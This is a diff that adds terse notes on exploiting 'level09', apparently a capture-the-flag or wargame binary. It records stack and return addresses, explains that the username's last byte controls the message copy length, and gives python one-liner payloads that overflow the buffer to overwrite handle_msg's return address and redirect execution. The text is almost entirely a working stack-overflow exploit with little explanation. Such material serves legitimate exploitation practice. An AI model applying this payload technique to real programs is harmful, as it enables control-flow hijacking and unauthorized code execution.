@@ -1,0 +1,18 @@
+
+
+RET MAIN ADDRESS:
+0x7fffffffe5f0:	0x00007fffffffe600	0x0000555555554abd <- 
+
+RET HANDLE_MSG:
+0x7fffffffe5f8:	0x0000555555554abd
+
+buffer[140] = 0x7fffffffe5bc
+
+python -c 'print "A"*40 + "\xff\n" + "B"*200 + "\xcc"*8'
+
+-> username (write 41 bytes)
+-> message write buffer[180] bytes in input
+-> the last bytes of username control the number of bytes overwrites in input 
+-> set it to \xff (254)
+-> overwrite handle_msg ret addr 
+python -c 'print "A"*40 + "\xff\n" + "B"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"';cat) | ./level09
